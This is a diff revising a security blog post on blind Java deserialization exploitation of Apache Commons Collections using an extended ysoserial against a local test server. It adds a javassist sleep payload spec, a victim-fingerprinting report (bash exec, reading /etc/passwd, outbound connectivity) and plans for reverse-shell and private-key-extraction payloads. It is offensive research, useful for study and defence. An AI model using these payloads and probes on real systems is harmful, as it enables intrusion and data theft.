@@ -1,15 +1,15 @@
 ---
 layout: post
-title:  "Blind Java Deserialization - Part II - exploitation"
+title:  "Blind Java Deserialization - Part II - exploitation rev 2"
 date:   2016-09-18 08:00:00 +0200
 categories: blog
-tags: hacking java deserialization commons blind exploitation
+tags: hacking java deserialization commons blind exploitation ysoserial
 excerpt_separator: <!-- more -->
 
 ---
 
 TL;DR: The practical exploitation of the blind java deserialization technique introduced in the previous blog post.
-Practical demonstration of the victim fingerprinting and string extraction (properties, files).
+Practical demonstration of the victim fingerprinting and information extraction from the system (properties, files).
 
 <!-- more -->
 
@@ -56,8 +56,9 @@ to construct such payload dynamically so we decided to build the payload from th
 
 ## JSON spec {#json}
 
-JSON specification determines how the resulting payload is constructed.
-[Generator.java] then parses the JSON and returns the binary payload.
+JSON specification is a scheme for the payload. It determines how the resulting payload is constructed
+by the [Generator.java] which takes the JSON spec as an input and produces binary payload with the functionality defined
+in the spec.
 
 Here are a few examples of payload construction:
 
@@ -141,7 +142,22 @@ This is handy if the application expects the HashMap after deserialization. With
 }}}
 ```
 
+The following JSON spec is different from others. It does not use Transformer chain, but javassist approach (see the [Part 1]).
+With javassist exploit classes user does not have to express the logic with Transformers but can use Java code directly.
+Obviously the expressivity in this case is much greater, more sophisticated payloads can be constructed (e.g., reverse shell).
+This kind of exploits was not our main focus, but
+we also support these for testing if the destination machine is vulnerable (see report below):
+
+```json
+{"javassist":"cc3", "code":"java.lang.Thread.sleep(5000L);"}
+```
+
 To learn more on gadget construction consult the [Generator.java] sources.
+
+User does not have to write JSON spec directly, [Attack.java] implements few interesting use cases for the user (it
+internally constructs JSON spec, payload is generated and used). But writing those may come handy if you want to
+express a new functionality or build payloads separately - e.g., build a REST server generating payloads -
+request = JSON spec, response = generated payload.
 
 ## String extraction {#strings}
 
@@ -174,29 +190,7 @@ Our regex alphabet:
 [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
 ```
 
-Then the practical search goes like this:
-
-```
-String is null: false
-String is empty: false
---Max length guess: 1
---Max length guess: 2
---Max length guess: 4
---Max length guess: 8
---Max length guess: 16
-Length is between 7 and 16
---Length: 7 - 16, mid: 12
---Length: 7 - 11, mid: 9
---Length: 7 - 8, mid: 8
---[0]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
---[0000]Length: 000 - 101, mid: 051. y: 1, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
---[0000]Length: 000 - 051, mid: 026. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./01234]                         vs [56789:;<=>?@ABCDEFGHIJKLM]
---[0000]Length: 026 - 051, mid: 039. y: 0, range: [56789:;<=>?@A]                         vs [BCDEFGHIJKLM]
---[0000]Length: 039 - 051, mid: 045. y: 0, range: [BCDEFG]                         vs [HIJKLM]
---[0000]Length: 045 - 051, mid: 048. y: 0, range: [HIJ]                         vs [KLM]
---[0000]Length: 048 - 051, mid: 050. y: 0, range: [KL]                         vs [M]
---[0]=✂M✂
-```
+The practical string extraction is demonstrated [below](#osname).
 
 ### Optimizations
 
@@ -215,17 +209,100 @@ The exploitation example is in [Attack.java] which demonstrates:
 - extraction of `os.name` property
 - extraction of `PATH` environment variable
 - extraction of `/etc/hosts` from the system
-- simple victim fingerprinting (java version, OS, security manager access, a few interesting properties)
+- simple victim fingerprinting (determines working exploit classes, java version, OS, security manager access, a few interesting properties)
+
+## Affected libraries
+
+The Blind attack is mainly focused on Apache Commons Collections library.
+[Affected versions] are Apache Commons Collections <= v3.2.1 and <= v4.0.
+The security problem is fixed in v3.2.2 and v4.1.
+
+## Further work
+
+* The work can be extended and added as a Metasploit module or Burp module.
+* Extending information extraction also to javassist exploits.
+* Implementation of reverse shell payload in javassist exploit class.
+* Improve the system fingerprinting, scan for running services (e.g., MySQL, Oracle, Tomcat).
+* Container fingerprinting (Tomcat, JBoss, WebSphere, ...).
+* Private key extraction from web servers & containers.
+* Implementation of DoS payloads.
 
 ## Demo {#demo}
 
-1. Start the [Deserialize test server]
+0. Clone [Deserialize test server] and [extended ysoserial].
+1. Start the [Deserialize test server].
 2. Test whether it is listening on port 8022 - in the readme of the server you find how to compile it and test it.
-3. Run the [GeneratorTest.java] test class. It constructs payloads from JSON specifications and runs them against the deserialize server.
-4. Run the [AttackTest.java] test class. It contains the exploitation technique demonstration described above.
+3. Run the [GeneratorTest.java] test class from the [extended ysoserial]. It constructs payloads from JSON specifications and runs them against the deserialize server.
+4. Run the [AttackTest.java] test class from the [extended ysoserial]. It contains the exploitation technique demonstration described above.
+The attack is launched against the test server and produces the report as below.
 5. Have fun.
 
-### os.name
+### Report - shortened
+The [Attack.java] runs an automated test against the victim to determine few interesting properties:
+
+```
+// Testing CommonsCollections - Transformer based, v3
+Sleep Commons01 worked: true
+Sleep Commons05 worked: true
+Sleep Commons06 worked: true
+
+// Testing javassist exploit classes
+// cc = CommonsCollections. cc2, cc4 uses v4 lib
+Javassist[       cb1] worked: false
+Javassist[       cc2] worked: false
+Javassist[       cc3] worked: true
+Javassist[       cc4] worked: false
+Javassist[ hibernate] worked: false
+Javassist[      weld] worked: false
+Javassist[     jboss] worked: false
+Javassist[      jdk7] worked: false
+Javassist[      json] worked: false
+Javassist[     rhino] worked: false
+Javassist[      rome] worked: false
+Javassist[   spring1] worked: false
+Javassist[   spring2] worked: false
+
+// Testing maximum length of the request
+// server accepts
+Length limit 1k passed: true
+Length limit 4k passed: true
+Length limit 16k passed: true
+Length limit 256k passed: true
+Exception in post Req
+Length limit 1M passed: false
+
+Java 4 version: true
+Java 5 version: true
+Java 6 version: true
+Java 7 version: true
+Java 8 version: true
+
+Security manager == null? true
+
+OS: win: false
+OS: mac: true
+OS: darwin: false
+OS: nux: false
+OS: sun: false
+OS: bsd: false
+
+OS: /bin/ping false
+OS: /sbin/ping true
+OS: /usr/bin/ping false
+OS: /usr/sbin/ping false
+OS: /usr/local/bin/ping false
+
+Can connect to google.com:80: true
+Can exec /bin/bash: true
+Can read /etc/passwd: true
+Can write to /tmp : true
+Can write to /var/tmp : true
+
+Going to extract property: os.name
+```
+
+### os.name {#osname}
+Example of a property extraction from the system.
 
 ```
 Going to extract property: os.name
@@ -314,40 +391,13 @@ Length is between 7 and 16
 Extracted string: Mac OS X
 ```
 
-### Report - shortened
-
-```
-Sleep worked: true
-Java 4 version: true
-Java 5 version: true
-Java 6 version: true
-Java 7 version: true
-Java 8 version: true
-Security manager == null? true
-OS: win: false
-OS: mac: true
-OS: darwin: false
-OS: nux: false
-OS: sun: false
-OS: bsd: false
-OS: /bin/ping false
-OS: /sbin/ping true
-OS: /usr/bin/ping false
-OS: /usr/sbin/ping false
-OS: /usr/local/bin/ping false
-Can connect to google.com:80: true
-Can exec /bin/bash: true
-Can read /etc/passwd: true
-Can write to /tmp : true
-Can write to /var/tmp : true
-```
-
 [Part 1]: https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html
 [ysoserial]: https://github.com/frohoff/ysoserial
+[extended ysoserial]: https://github.com/yolosec/ysoserial
 [Deserialize test server]: https://github.com/yolosec/deserialize-server
 [Generator.java]: https://github.com/yolosec/ysoserial/blob/master/src/main/java/ysoserial/blind/Generator.java
 [Attack.java]: https://github.com/yolosec/ysoserial/blob/master/src/main/java/ysoserial/blind/Attack.java
 [GeneratorTest.java]: https://github.com/yolosec/ysoserial/blob/master/src/test/java/ysoserial/blind/GeneratorTest.java
 [AttackTest.java]: https://github.com/yolosec/ysoserial/blob/master/src/test/java/ysoserial/blind/AttackTest.java
-
+[Affected versions]: https://commons.apache.org/proper/commons-collections/security-reports.html#Apache_Commons_Collections_Security_Vulnerabilities
 
